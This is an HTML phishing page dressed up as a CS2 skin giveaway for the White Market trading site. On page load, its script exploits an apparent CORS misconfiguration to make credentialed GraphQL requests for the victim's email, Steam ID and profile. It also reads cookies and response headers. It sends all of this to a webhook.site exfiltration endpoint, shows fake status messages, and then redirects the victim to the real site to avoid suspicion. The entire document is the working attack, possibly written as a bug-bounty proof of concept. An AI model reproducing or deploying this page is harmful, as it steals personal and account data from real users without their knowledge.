<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free CS2 Skins - White Market Giveaway!</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            text-align: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            font-size: 1.2em;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ Claiming Your Free CS2 Skins!</h1>
        <div class="spinner"></div>
        <div class="status" id="status">Verifying your account...</div>
    </div>

    <script>
        // Configuration - CHANGE THIS TO YOUR ATTACKER SERVER
        const EXFIL_SERVER = 'https://webhook.site/23b9c460-f601-4ae9-aca0-80a40aedd5d3';  // Use webhook.site or your server
        
        // Status messages
        const statusEl = document.getElementById('status');
        let exfilData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            cookies: document.cookie,
            data: {}
        };

        async function updateStatus(message) {
            statusEl.textContent = message;
            console.log('[*]', message);
        }

        async function exploit() {
            try {
                await updateStatus('Connecting to White Market API...');
                
                // Step 1: Send OPTIONS preflight to warm up CORS
                await fetch('https://api.white.market/graphql/api', {
                    method: 'OPTIONS',
                    headers: {
                        'Access-Control-Request-Method': 'POST',
                        'Access-Control-Request-Headers': 'content-type'
                    }
                });
                
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // Step 2: Try to read cookies directly (if HttpOnly is false)
                await updateStatus('Checking authentication...');
                const cookies = document.cookie;
                exfilData.cookies = cookies;
                console.log('[+] Cookies:', cookies);
                
                // Step 3: Make authenticated GraphQL request to get user data
                await updateStatus('Loading your profile...');
                
                const profileQuery = {
                    query: `
                        query PersonProfile {
                            person: person_profile {
                                id
                                email
                                steamId
                                steamName
                                steamAvataFull
                                referrerCode
                                isEmailConfirmed
                                locale
                                countryCodeOfResidence
                                level
                                points
                                registeredAt
                            }
                        }
                    `,
                    operationName: "PersonProfile"
                };
                
                const response = await fetch('https://api.white.market/graphql/api', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    credentials: 'include',  // CRITICAL: Send victim's cookies
                    body: JSON.stringify(profileQuery)
                });
                
                const data = await response.json();
                exfilData.data.profile = data;
                
                console.log('[+] Profile data:', data);
                await updateStatus('Processing your rewards...');
                
                // Step 4: Try to extract response headers (check for Set-Cookie)
                const responseHeaders = {};
                response.headers.forEach((value, key) => {
                    responseHeaders[key] = value;
                });
                exfilData.data.responseHeaders = responseHeaders;
                
                // Step 5: Try another query to get more sensitive data
                const walletQuery = {
                    query: `
                        query {
                            person: person_profile {
                                id
                                email
                            }
                        }
                    `,
                    operationName: null
                };
                
                const walletResponse = await fetch('https://api.white.market/graphql/api', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    credentials: 'include',
                    body: JSON.stringify(walletQuery)
                });
                
                const walletData = await walletResponse.json();
                exfilData.data.additional = walletData;
                
                // Step 6: Exfiltrate all collected data
                await updateStatus('Finalizing...');
                
                await fetch(EXFIL_SERVER, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    mode: 'no-cors',  // Bypass CORS for exfiltration
                    body: JSON.stringify(exfilData)
                });
                
                console.log('[+] Data exfiltrated successfully!');
                console.log('[+] Exfiltrated data:', exfilData);
                
                // Show success message
                await updateStatus('Success! Redirecting...');
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Redirect to legitimate White Market to avoid suspicion
                window.location.href = 'https://white.market';
                
            } catch (error) {
                console.error('[-] Exploit failed:', error);
                exfilData.error = {
                    message: error.message,
                    stack: error.stack
                };
                
                // Still try to exfiltrate error data
                try {
                    await fetch(EXFIL_SERVER, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        mode: 'no-cors',
                        body: JSON.stringify(exfilData)
                    });
                } catch (e) {
                    console.error('[-] Exfiltration also failed:', e);
                }
                
                await updateStatus('Processing... Please wait.');
                await new Promise(resolve => setTimeout(resolve, 3000));
                window.location.href = 'https://white.market';
            }
        }

        // Auto-execute on page load
        window.addEventListener('load', exploit);
    </script>
</body>
</html>
